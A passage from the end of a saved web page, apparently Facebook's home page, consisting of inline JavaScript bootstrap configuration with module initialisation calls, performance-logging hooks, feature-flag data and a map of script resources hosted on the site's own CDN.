                            rt: 262144,
                            hbcbc: 2,
                            hbvbc: 0,
                            hbbi: 30,
                            sid: -1,
                            hbv: "1365976703063853455"
                        }]
                    ],
                    ["CavalryLoggerImpl", "startInstrumentation", [],
                        []
                    ],
                    ["NavigationMetrics", "setPage", [],
                        [{
                            page: "XIndexReduxController",
                            page_type: "normal",
                            page_uri: "https://www.facebook.com/",
                            serverLID: "7100008947758635071-0"
                        }]
                    ],
                    ["FalcoLoggerTransports", "attach", [],
                        []
                    ],
                    ["Chromedome", "start", [],
                        [{}]
                    ],
                    ["DimensionTracking"],
                    ["ClickRefLogger"],
                    ["DetectBrokenProxyCache", "run", [],
                        [0, "c_user"]
                    ],
                    ["NavigationClickPointHandler"],
                    ["ServiceWorkerURLCleaner", "removeRedirectID", [],
                        []
                    ],
                    ["WebDevicePerfInfoLogging", "doLog", [],
                        []
                    ],
                    ["WebStorageMonster", "schedule", [],
                        []
                    ],
                    ["Artillery", "disable", [],
                        []
                    ],
                    ["ScriptPathLogger", "startLogging", [],
                        []
                    ],
                    ["TimeSpentBitArrayLogger", "init", [],
                        []
                    ],
                    ["RequireDeferredReference", "unblock", [],
                        [
                            ["VisualCompletionGating"], "sd"
                        ]
                    ],
                    ["RequireDeferredReference", "unblock", [],
                        [
                            ["VisualCompletionGating"], "css"
                        ]
                    ]
                ]
            },
            hsrp: {
                hsdp: {
                    clpData: {
                        "1743095": {
                            r: 1,
                            s: 1
                        },
                        "1871697": {
                            r: 1,
                            s: 1
                        },
                        "1829319": {
                            r: 1
                        },
                        "1829320": {
                            r: 1
                        },
                        "1843988": {
                            r: 1
                        }
                    },
                    gkxData: {
                        "1652843": {
                            result: false,
                            hash: "AT6uh9NWRY4QEQoYDqs"
                        }
                    }
                },
                hblp: {
                    consistency: {
                        rev: 1005560434
                    },
                    rsrcMap: {
                        oGyPAQE: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3idBq4/ye/l/en_GB/IqiabJtYLcG.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        CBQ4zUl: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/X58kjR_cPB8.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        FEt5GzN: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/KWY7Edb5_DT.js?_nc_x=Ij3Wp8lg5Kz"
                        }
                    },
                    compMap: {
                        TransportSelectingClientSingleton: {
                            r: ["/hl4ZY6", "To8CHca"],
                            rds: {
                                m: ["ContextualConfig", "BladeRunnerClient",
                                    "DGWRequestStreamClient", "MqttLongPollingRunner",
                                    "BanzaiScuba_DEPRECATED"
                                ],
                                r: ["oGyPAQE", "I4BfZ8R", "H099fEQ", "kP1XEF1", "00Aws6K",
                                    "k2hUbUf"]
                            },
                            be: 1
                        },
                        RequestStreamCommonRequestStreamCommonTypes: {
                            r: ["/hl4ZY6"],
                            be: 1
                        }
                    }
                }
            },
            allResources: ["To8CHca", "CBQ4zUl", "kP1XEF1", "I4BfZ8R", "w3Wk9lz", "xfkMCpl",
                "FEt5GzN", "5sQ5HiS", "00Aws6K", "VzF4auJ", "OeK4roN", "rq2J+HZ"
            ],
            onload: [
                "CavalryLogger.getInstance(\"7100008947758635071-0\").setTTIEvent(\"t_domcontent\");"
            ],
            onafterload: [
                "CavalryLogger.getInstance(\"7100008947758635071-0\").collectBrowserTiming(window)",
                "window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp(\"t_paint\");",
                "if (window.ExitTime){CavalryLogger.getInstance(\"7100008947758635071-0\").setValue(\"t_exit\", window.ExitTime);};"
            ]
        });
    }));
    </script>
</body>

</html>